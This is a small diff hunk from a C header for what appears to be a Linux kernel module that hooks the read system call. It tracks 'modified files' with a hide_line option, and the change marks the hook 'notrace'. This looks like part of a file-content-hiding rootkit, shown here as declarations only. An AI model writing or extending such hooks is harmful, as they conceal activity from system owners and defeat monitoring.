@@ -26,7 +26,7 @@ extern spinlock_t modified_files_lock;
 
 extern asmlinkage long (*__orig_read)(const struct pt_regs *);
 
-asmlinkage long read_hook(const struct pt_regs *regs);
+asmlinkage long notrace read_hook(const struct pt_regs *regs);
 
 int add_modified_file(const char *path,
                       int hide_line,
